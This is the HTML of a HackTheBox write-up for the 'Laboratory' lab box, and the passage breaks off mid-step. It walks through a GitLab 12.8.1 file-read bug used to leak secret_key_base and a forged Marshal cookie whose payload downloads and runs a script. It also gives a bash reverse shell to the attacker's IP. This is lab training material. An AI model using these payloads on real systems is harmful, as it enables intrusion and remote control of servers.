<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>Laboratory - HackTheBox Writeup (10.10.10.216)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="Laboratory - HackTheBox Writeup (10.10.10.216)">
  
    <meta name="description" content="Easy-difficulty Linux box with a focus on exploiting local file inclusion and insecure deserialisation vulnerabilities in GitLab 12.8.1. Privilege escalation by escaping the Docker container and abusing a SUID binary with a PATH hijacking attack.">
    <meta property="og:description" content="Easy-difficulty Linux box with a focus on exploiting local file inclusion and insecure deserialisation vulnerabilities in GitLab 12.8.1. Privilege escalation by escaping the Docker container and abusing a SUID binary with a PATH hijacking attack.">
  
  
    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/97b6b79de818229932e1d9d645b50f62.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/97b6b79de818229932e1d9d645b50f62.png"></span>
      </div>
    
    <h1 class="Header__Title">Laboratory - HackTheBox Writeup (10.10.10.216)</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Apr 18, 2021</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
            <a href="tag/Easy">Easy</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
            <a href="tag/Linux">Linux</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/GitLab">GitLab</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
            <a href="tag/Docker">Docker</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
            <a href="tag/PATH_Hijacking">PATH Hijacking</a>
          </span>
        
      </div>
      <div>
        Easy-difficulty Linux box with a focus on exploiting local file inclusion and insecure deserialisation vulnerabilities in GitLab 12.8.1. Privilege escalation by escaping the Docker container and abusing a SUID binary with a PATH hijacking attack.
      </div>
    
  </header>
  <article id="https://www.notion.so/be38375b95324776b2e5dd354ea9ac64" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/42fcb8fb24084cf39ab4ccb6b30ec298" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/42fcb8fb24084cf39ab4ccb6b30ec298"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/6d548fc74ea948359504fddd3aad37d4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/a693fe9797e741938f6e70903212423f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.216 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/126e4c743dcc4724bef7c86a63131b38" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https</span></span></span></code></pre></li><li id="https://www.notion.so/20f434eef74f4c93a83ab7f7a4e23fc2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/89cd967896f740f4a153d47a4fc7dc9d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80,443 10.10.10.216 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/60b5daf539024c5bb9b46dd04aec5ba3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1</span></span></span></code></pre><div id="https://www.notion.so/ddf6ba0afc5e4f03a55dade459d5d262" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Apache httpd 2.4.41 (HTTP/SSL).</span></span></p></div></li></ul><h2 id="https://www.notion.so/4bbe4160465b4f09949aec5141f2bf1a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/4bbe4160465b4f09949aec5141f2bf1a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><div id="https://www.notion.so/8e78be5eeeb34812ac93003c09f8d2a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTP Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/bad9ffab75a8459bb49150aa591cc321" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">HTTP automatically redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">laboratory.htb</code></span><span class="SemanticString">, add domain names to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/e2a346a4c8a54f01b07cdbef514f3aa5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">10.10.10.216  laboratory.htb</code></span></span></p></div></li><li id="https://www.notion.so/f7baeb3ed59b472e9d72c8472e911e40" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">From the targeted scan, we also see that there is a git subdomain:</span></span><pre id="https://www.notion.so/a7680eb19a254399a0d8d8b024eea30e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Subject Alternative Name: DNS:git.laboratory.htb</span></span></span></code></pre></li><li id="https://www.notion.so/e16bb267acc94bba826def8b1c06aa33" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Add the subdomain to the line in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString"> as well:</span></span><div id="https://www.notion.so/54fd3bee15c24158b1d038cb473d4add" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">10.10.10.216  laboratory.htb  git.laboratory.htb</code></span></span></p></div></li><li id="https://www.notion.so/f90d8d96daf7411380f55da65833c8c2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Laboratory CEO&#x27;s name is &quot;Dexter&quot;, potential username.</span></span></li></ul><div id="https://www.notion.so/b5e80e78f18c4566a8633fb8d5292876" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTPS Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/d36367cd28fc480eb24ceaa381055fb7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port 443 is hosting a GitLab repository.</span></span></li><li id="https://www.notion.so/9773837baadf4e099db52add239a8f60" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">GitLab login page:</span></span><div id="https://www.notion.so/88b4421eba1d4c5e88c32d7a8122dd94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://git.laboratory.htb/users/sign_in">https://git.laboratory.htb/users/sign_in</a></span></span></p></div></li><li id="https://www.notion.so/e84348f2d39349a58101635c2be3991c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Attempt to register for an account:</span></span><pre id="https://www.notion.so/2372214875bb43328969cc9d0f39ffd0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>1 error prohibited this user from being saved:
Email domain is not authorized for sign-up</span></span></span></code></pre></li><li id="https://www.notion.so/cb272228d7774251a6fc220c853945d1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Attempting to register again with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">@laboratory.htb</code></span><span class="SemanticString"> email address, was redirected to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git.laboratory.htb/users</code></span><span class="SemanticString"> which 404&#x27;d.</span></span></li><li id="https://www.notion.so/f853e56e67ce43df9364696628e5b49b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigating back to homepage, we see that we&#x27;re registered and have logged in successfully. No email verification was necessary.</span></span></li><li id="https://www.notion.so/7dc6ffb4a6a7444fb9ea93b0dc727079" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Version info is exposed on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://git.laboratory.htb/help">https://git.laboratory.htb/help</a></span><span class="SemanticString">, the server is running GitLab Community Edition 12.8.1.</span></span></li><li id="https://www.notion.so/3aa9db6a3422439c856a0e3241836cf8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This version of GitLab is newer than the previously similar box, </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.notion.so/f6e936bd2d9849aeb0c3f774cb5e1f53">Ready</a></span><span class="SemanticString">, and is not vulnerable to the same Webhooks SSRF and CRLF injection.</span></span></li><li id="https://www.notion.so/2cfdc82acaab4dc0a5c0ea6c3c63acd5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">However, it is vulnerable to a different local file inclusion (LFI) attack, specifically in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">UploadsRewriter</code></span><span class="SemanticString"> module.</span></span></li><li id="https://www.notion.so/335a26b93ed947a0bf70be94f5b266b0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">File names and paths of upload attachments are not checked when copying an issue between projects, which allows us to read arbitrary files on the server.</span></span></li></ul><h2 id="https://www.notion.so/1e04844e7fa44a248bf8353c96a4f9ec" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1e04844e7fa44a248bf8353c96a4f9ec"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><div id="https://www.notion.so/7ecdea64af43422687d854e19985e223" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Exploiting LFI in GitLab</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/241b516d19bb44e3b90c4fc4ff5501cc" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">While there is a Metasploit module (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">multi/http/gitlab_file_read_rce</code></span><span class="SemanticString">) which can automate the exploit, let us do the exploit manually this time.</span></span></li><li id="https://www.notion.so/f0244f62dac849e18f6575f9ad9058c3" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">According to the HackerOne report on this vulnerability, it is possible to read local files using the upload string:</span></span><pre id="https://www.notion.so/468cc9efa61f498bb0188d72375ac481" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token url"><span class="token operator">!</span>[<span class="token content">a</span>](<span class="token url">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../PATH_TO_FILE</span>)</span></span></span></span></code></pre></li><li id="https://www.notion.so/2009fab366ae421eaa311c355b913aa8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can turn this LFI attack into an RCE as the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cookies_serializer</code></span><span class="SemanticString"> is set to the unsafe option </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hybrid</code></span><span class="SemanticString"> by default.</span></span></li><li id="https://www.notion.so/70acb204d57f413c84503f298b6042bc" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Payloads can be sent by changing our own local GitLab instance&#x27;s secret_key_base to match the target&#x27;s.</span></span></li><li id="https://www.notion.so/03cdb8b26a5b4fa78e84eec17c26e9c4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Target </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">secret_key_base</code></span><span class="SemanticString"> can be found by reading </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/6b159b70dd2e4efebdd4b788154211a9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token url"><span class="token operator">!</span>[<span class="token content">a</span>](<span class="token url">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</span>)</span></span></span></span></code></pre></li><li id="https://www.notion.so/ccf2040c0940446a8f840b55233ecb40" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Download </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">secrets.yml</code></span><span class="SemanticString"> from moved issue, and we can obtain the target&#x27;s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">secret_key_base</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/b65906bf09e446ba8ecba857641172e6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span></span></span></code></pre></li></ul><div id="https://www.notion.so/30122061e45343cfb69817466da1fa07" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Setting up our own GitLab instance</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/f30206d0999c485089141478f2bb6221" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Install Docker:</span></span><div id="https://www.notion.so/cc8ebb1b35404bc6872b658178b1cac5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo pacman -S docker</code></span></span></p></div></li><li id="https://www.notion.so/7571a40d58b449eca04b1b5e41ebeed2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Start Docker daemon:</span></span><div id="https://www.notion.so/1a995fc99bf44fee8cda6af1c5a49047" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo systemctl start docker</code></span></span></p></div></li><li id="https://www.notion.so/729d1078d5f142d59aa1f09c354f0225" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Pull vulnerable version of GitLab from repository:</span></span><div id="https://www.notion.so/64bd48f641ca4c5e96f835828d34f713" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo docker pull gitlab/gitlab-ce:12.8.1-ce.0</code></span></span></p></div></li><li id="https://www.notion.so/0c8e866557514d7aa0bc46db846dbf7a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Set up $GITLAB_HOME:</span></span><div id="https://www.notion.so/30112b9e12954a2699c41ca3f4d725c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ mkdir /srv/gitlab</code></span></span></p></div><div id="https://www.notion.so/d2f58f6db76e451595af786f97784fe1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ export GITLAB_HOME=/srv/gitlab</code></span></span></p></div></li><li id="https://www.notion.so/0578982eab2e46bfade82d7fec98a395" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Start GitLab container:</span></span><div id="https://www.notion.so/1dcf340667b0401eb75b553095df36fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo docker run --detach \
--hostname git.laboratory.htb \
--publish 443:443 --publish 80:80 --publish 22:22 \
--name gitlab \
--restart always \
--volume $GITLAB_HOME/config:/etc/gitlab:Z \
--volume $GITLAB_HOME/logs:/var/log/gitlab:Z \
--volume $GITLAB_HOME/data:/var/opt/gitlab:Z \
gitlab/gitlab-ce:12.8.1-ce.0</code></span></span></p></div></li><li id="https://www.notion.so/86e4fb82ec1849bf872f7eb645359171" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Check whether if container is running:</span></span><div id="https://www.notion.so/34d7330485ac42d3b1ba8e0ec0ff00a5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo docker ps</code></span></span></p></div><pre id="https://www.notion.so/40f382713f454b9dbfcce00361ab70c8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>CONTAINER ID   IMAGE                          COMMAND             CREATED          STATUS                             PORTS                                                          NAMES
dffc9c86e108   gitlab/gitlab-ce:12.8.1-ce.0   &quot;/assets/wrapper&quot;   40 seconds ago   Up 38 seconds (health: starting)   0.0.0.0:22-&gt;22/tcp, 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp   gitlab</span></span></span></code></pre></li><li id="https://www.notion.so/2ee932b5fcfe4323adaf64dcdc4475f7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Now that the container is running, we can get a bash shell in the container:</span></span><div id="https://www.notion.so/a9eb2e56b5ca4164802ada9763aed7dd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo docker exec -it gitlab /bin/bash</code></span></span></p></div></li><li id="https://www.notion.so/30dfd26f76234a3d9268b06ddf0c3acd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigate to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/gitlab/embedded/service/gitlab-rails/config/</code></span><span class="SemanticString">, replace the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">secret_key_base</code></span><span class="SemanticString"> in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">secrets.yml</code></span><span class="SemanticString"> with our target&#x27;s key.</span></span></li><li id="https://www.notion.so/6b56aa3d4c884554886760c76602e618" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Reconfigure and restart GitLab:</span></span><div id="https://www.notion.so/314d133fb9fa479293076891add566c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gitlab-ctl reconfigure</code></span></span></p></div><div id="https://www.notion.so/e54053dad27a4e18a2abd04a2925c0b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gitlab-ctl restart</code></span></span></p></div><div id="https://www.notion.so/d2764e5819e5497d874b1b8683239bcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">(Unicorn service may become stuck, kill and restart if needed)</span></span></p></div></li><li id="https://www.notion.so/239b628408274c1c880710dcfe43f16d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Start up GitLab console:</span></span><div id="https://www.notion.so/9f301befbc23484397323fe0eaba6a67" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gitlab-rails console</code></span></span></p></div><pre id="https://www.notion.so/cf88a0c6668f4a91b8036a4919edebcc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>--------------------------------------------------------------------------------
GitLab:       12.8.1 (d18b43a5f5a) FOSS
GitLab Shell: 11.0.0
PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0&gt; _</span></span></span></code></pre></li><li id="https://www.notion.so/f792880918334c788395fd8a4cef2eb6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can see that the version info matches our victim&#x27;s, meaning we have installed the correct version.</span></span></li><li id="https://www.notion.so/d97606dbc3fb483bb9f805bc7985dac7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">From here, we can serialise our payload into a cookie, and send it to the target to exploit the LFI vulnerability remotely.</span></span></li><li id="https://www.notion.so/4309278e556c42569748c220dae6e848" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In our </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitlab-rails</code></span><span class="SemanticString"> console, we can generate the payload cookie with:</span></span><pre id="https://www.notion.so/b956eaf7463d43af837ea99a3aa5d701" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>request <span class="token operator">=</span> <span class="token constant">ActionDispatch</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Request</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token constant">Rails</span><span class="token punctuation">.</span>application<span class="token punctuation">.</span>env_config<span class="token punctuation">)</span>
request<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">"action_dispatch.cookies_serializer"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token symbol">:marshal</span>
cookies <span class="token operator">=</span> request<span class="token punctuation">.</span>cookie_jar
erb <span class="token operator">=</span> <span class="token constant">ERB</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"&lt;%= `wget http://10.10.14.103:9090/reverse.sh &amp;&amp; chmod +x reverse.sh &amp;&amp; ./reverse.sh` %>"</span><span class="token punctuation">)</span>
depr <span class="token operator">=</span> <span class="token constant">ActiveSupport</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Deprecation</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">DeprecatedInstanceVariableProxy</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>erb<span class="token punctuation">,</span> <span class="token symbol">:result</span><span class="token punctuation">,</span> <span class="token string">"@result"</span><span class="token punctuation">,</span> <span class="token constant">ActiveSupport</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Deprecation</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span>
cookies<span class="token punctuation">.</span>signed<span class="token punctuation">[</span><span class="token symbol">:cookie</span><span class="token punctuation">]</span> <span class="token operator">=</span> depr
puts cookies<span class="token punctuation">[</span><span class="token symbol">:cookie</span><span class="token punctuation">]</span></span></span></span></code></pre></li><li id="https://www.notion.so/3501907c9cfd46038ed40a189e7c8769" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create a simple reverse shell script, and host it on HTTP with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">updog</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/05da6e26c32249c088e237f33a1c8256" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
<span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/10.10.14.103/6969 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></span></span></span></code></pre></li><li id="https://www.notion.so/052fb3aeb39d4fa9a75fdb8bc87d27e2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for incoming shell connection with netcat:</span></span><div id="https://www.notion.so/4dd325430cac407b9894ef225364bb18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/f89134f9057949c599aa857f6333fc34" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Send the cookie under </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">experimentation_subject_id</code></span><span class="SemanticString"> field using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">, don&#x27;t forget the </span><span 